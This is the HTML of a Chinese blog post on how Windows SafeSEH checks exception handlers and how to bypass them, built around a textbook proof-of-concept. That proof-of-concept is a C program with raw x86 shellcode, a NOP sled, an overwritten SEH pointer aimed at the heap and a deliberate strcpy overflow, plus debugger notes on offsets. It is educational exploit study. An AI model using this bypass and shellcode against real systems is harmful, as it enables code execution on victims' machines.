@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="chinese">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="0day安全,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="在Windows XP SP2 及后续版本的操作系统中，微软引入了著名的S.E.H 校验机制SafeSEH。">
+<meta name="keywords" content="0day安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SafeSEH的理解">
+<meta property="og:url" content="http://yoursite.com/2019/12/08/safeSEH的理解/index.html">
+<meta property="og:site_name" content="loser的博客">
+<meta property="og:description" content="在Windows XP SP2 及后续版本的操作系统中，微软引入了著名的S.E.H 校验机制SafeSEH。">
+<meta property="og:locale" content="chinese">
+<meta property="og:image" content="http://yoursite.com/2019/12/08/safeSEH的理解/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/08/safeSEH的理解/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/08/safeSEH的理解/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/08/safeSEH的理解/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/08/safeSEH的理解/5.png">
+<meta property="og:updated_time" content="2019-12-11T11:59:15.817Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SafeSEH的理解">
+<meta name="twitter:description" content="在Windows XP SP2 及后续版本的操作系统中，微软引入了著名的S.E.H 校验机制SafeSEH。">
+<meta name="twitter:image" content="http://yoursite.com/2019/12/08/safeSEH的理解/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/12/08/safeSEH的理解/">
+
+
+
+
+
+  <title>SafeSEH的理解 | loser的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="chinese">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">loser的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/08/safeSEH的理解/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="loser">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="loser的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SafeSEH的理解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-12-08T21:54:00+08:00">
+                2019-12-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在Windows XP SP2 及后续版本的操作系统中，微软引入了著名的S.E.H 校验机制SafeSEH。<br><a id="more"></a></p>
+<h1 id="保护原理"><a href="#保护原理" class="headerlink" title="保护原理"></a>保护原理</h1><p>（1）检查异常处理链是否位于当前程序的栈中，如果不在当前栈中，程序将终止异常处理函数的调用。<br>（2）检查异常处理函数指针是否指向当前程序的栈中，如果指向当前栈中，程序将终止异常处理函数的调用。<br>（3）在前面两项检查都通过后，程序调用一个全新的函数RtlIsValidHandler()，来对异常处理函数的有效性进行验证。</p>
+<h2 id="RtlIsValidHandler函数"><a href="#RtlIsValidHandler函数" class="headerlink" title="RtlIsValidHandler函数"></a>RtlIsValidHandler函数</h2><p>（1）判断程序是否设置了IMAGE_DLLCHARACTERISTICS_NO_SEH 标识。如果设置了这个标识，这个程序内的异常会被忽略。所以当这个标志被设置时，函数直接返回校验失败。</p>
+<p>（2）检测程序是否包含安全S.E.H 表。如果程序包含安全S.E.H 表，则将当前的异常处理函数地址与该表进行匹配，匹配成功则返回校验成功，匹配失败则返回校验失败。</p>
+<p>（3）判断程序是否设置ILonly 标识。如果设置了这个标识，说明该程序只包含.NET 编译人中间语言，函数直接返回校验失败。</p>
+<p>（4）判断异常处理函数地址是否位于不可执行页（non-executable page）上。当异常处理函数地址位于不可执行页上时，校验函数将检测DEP 是否开启，如果系统未开启DEP 则返回校验成功，否则程序抛出访问违例的异常<br>如果异常处理函数的地址没有包含在加载模块的内存空间，校验函数将直接进行DEP 相关检测，函数依次进行如下校验。</p>
+<p>（1）判断异常处理函数地址是否位于不可执行页（non-executable page）上。当异常处理函数地址位于不可执行页上时，校验函数将检测DEP 是否开启，如果系统未开启DEP 则返回校验成功，否则程序抛出访问违例的异常。</p>
+<p>（2）判断系统是否允许跳转到加载模块的内存空间外执行，如果允许则返回校验成功，否则返回校验失败。<br><img src="1.png" alt=""><br>RtlIsValidHandler()函数会在哪些情况下的允许异常处理函数执行。<br>（1）异常处理函数位于加载模块内存范围之外，DEP 关闭。<br>（2）异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH（安全S.E.H 表为空），同时相应模块不是纯IL。</p>
+<p>（3）异常处理函数位于加载模块内存范围之内，相应模块启用SafeSEH（安全S.E.H 表不为空），异常处理函数地址包含在安全S.E.H 表中。</p>
+<p>我们来分析一下这三种情况的可行性。<br>（1）现在我们只考虑SafeSEH，不考虑DEP，针对DEP 的讨论我们放到下一节中。排除DEP 干扰后，我们只需在加载模块内存范围之外找到一个跳板指令就可以转入shellcode 执行，这点还是比较容易实现的。</p>
+<p>（2）在第二种情况中，我们可以利用未启用SafeSEH 模块中的指令作为跳板，转入shellcode执行，这也是为什么我们说SafeSEH 需要操作系统与编译器的双重支持。在加载模块中找到一个未启用的SafeSEH 模块也不是一件很困难的事情。</p>
+<p>（3）这种情况下我们有两种思路可以考虑，一是清空安全S.E.H 表，造成该模块未启用SafeSEH 的假象；二是将我们的指令注册到安全S.E.H 表中。由于安全S.E.H 表的信息在内存中是加密存放的，所以突破它的可能性也不大，这条路我们就先放弃吧。</p>
+<p>所以 是有方法突破SafeSEH的 但比较麻烦 但还是有简单方法的突破的<br>（1）不攻击S.E.H（太邪恶了），可以考虑覆盖返回地址或者虚函数表等信息。<br>（2）利用S.E.H 的终极特权！这种安全校验存在一个严重的缺陷——如果S.E.H 中的异常函数指针指向堆区，即使安全校验发现了S.E.H 已经不可信，仍然会调用其已被修改过的异常处理函数，因此只要将shellcode 布置到堆区就可以直接跳转执行！</p>
+<h1 id="攻击返回地址绕过SafeSEH"><a href="#攻击返回地址绕过SafeSEH" class="headerlink" title="攻击返回地址绕过SafeSEH"></a>攻击返回地址绕过SafeSEH</h1><p>如果碰到一个程序，他启用了SafeSEH 但是未启用GS，或者启用了GS 但是刚好被攻击的函数没有GS 保护（我们不考虑这种事情发生的概率，而且这种漏洞的的确确存在），攻击者肯定会直接攻击函数返回地址。</p>
+<h1 id="利用虚函数绕过SafeSEH"><a href="#利用虚函数绕过SafeSEH" class="headerlink" title="利用虚函数绕过SafeSEH"></a>利用虚函数绕过SafeSEH</h1><p>通过攻击虚函数表来劫持程序流程，这个过程不涉及任何异常处理，SafeSEH 也就只是个摆设。</p>
+<h1 id="从堆中绕过SafeSEH"><a href="#从堆中绕过SafeSEH" class="headerlink" title="从堆中绕过SafeSEH"></a>从堆中绕过SafeSEH</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">/*****************************************************************************</span><br><span class="line">      To be the apostrophe which changed &quot;Impossible&quot; into &quot;I&apos;m possible&quot;!</span><br><span class="line">		</span><br><span class="line">POC code of chapter 11 in book &quot;Bypass SafeSEH by jumping into heap&quot;</span><br><span class="line"> </span><br><span class="line">file name	: SEH_Heap.cpp</span><br><span class="line">author		: zihan  </span><br><span class="line">date		: 2010.04.02</span><br><span class="line">description	: demo show of how to bypass SafeSEH through jumping into heap</span><br><span class="line">Noticed		:	1 complied with VS 2008</span><br><span class="line">				2 disable optimization</span><br><span class="line">			    3 build into release version</span><br><span class="line">			    4 SEH offset and shellcode address may need </span><br><span class="line">			      to make sure via runtime debug</span><br><span class="line">version		: 1.0</span><br><span class="line">E-mail		: zihanlion@live.cn</span><br><span class="line">		</span><br><span class="line">	Only for educational purposes    enjoy the fun from exploiting :)</span><br><span class="line">******************************************************************************/</span><br><span class="line">#include &lt;stdafx.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char shellcode[]=</span><br><span class="line">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span><br><span class="line">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span><br><span class="line">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span><br><span class="line">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span><br><span class="line">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span><br><span class="line">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span><br><span class="line">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span><br><span class="line">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span><br><span class="line">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span><br><span class="line">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span><br><span class="line">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\xA0\x29\x39\x00&quot;//address of shellcode in heap</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void test(char * input)</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	char str[200];</span><br><span class="line">	strcpy(str,input);	</span><br><span class="line">    int zero=0;</span><br><span class="line">	zero=1/zero;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	char * buf=(char *)malloc(500);</span><br><span class="line">	//__asm int 3</span><br><span class="line">	strcpy(buf,shellcode);</span><br><span class="line">	test(shellcode);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对实验思路和代码简要解释如下。<br>（1）首先在堆中申请500 字节的空间，用来存放shellcode。<br>（2）函数test 存在一个典型的溢出，通过向str 复制超长字符串造成str 溢出，进而覆盖程序的S.E.H 信息。<br>（3）用shellcode 在堆中的起始地址覆盖异常处理函数地址，然后通过制造除0 异常，将程序转入异常处理，进而跳转到堆中的shellcode 执行。</p>
+<p>首先在call malloc函数后打断点 确定在堆中申请空间的首字节<br><img src="2.png" alt=""><br>接下来看复制字符串的地址 还有SEH指针的位置<br><img src="3.png" alt=""><br><img src="4.png" alt=""><br>被溢出的字符串起始位置为0x0012FE8C，S.E.H 异常处理函数指针位于0x0012FFB0+4 的位置,所以我们使用300 个字节就可以覆盖掉异常处理函数指针。<br><img src="5.png" alt=""></p>
+<h1 id="利用未启用SafeSEH模块绕过SafeSEH"><a href="#利用未启用SafeSEH模块绕过SafeSEH" class="headerlink" title="利用未启用SafeSEH模块绕过SafeSEH"></a>利用未启用SafeSEH模块绕过SafeSEH</h1>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/0day安全/" rel="tag"># 0day安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/03/关于GS的栈保护突破/" rel="next" title="关于GS的栈保护突破">
+                <i class="fa fa-chevron-left"></i> 关于GS的栈保护突破
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2049/11/30/C-学习笔记/" rel="prev" title="C++学习笔记">
+                C++学习笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">loser</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">54</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#保护原理"><span class="nav-number">1.</span> <span class="nav-text">保护原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RtlIsValidHandler函数"><span class="nav-number">1.1.</span> <span class="nav-text">RtlIsValidHandler函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#攻击返回地址绕过SafeSEH"><span class="nav-number">2.</span> <span class="nav-text">攻击返回地址绕过SafeSEH</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用虚函数绕过SafeSEH"><span class="nav-number">3.</span> <span class="nav-text">利用虚函数绕过SafeSEH</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#从堆中绕过SafeSEH"><span class="nav-number">4.</span> <span class="nav-text">从堆中绕过SafeSEH</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用未启用SafeSEH模块绕过SafeSEH"><span class="nav-number">5.</span> <span class="nav-text">利用未启用SafeSEH模块绕过SafeSEH</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">loser</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
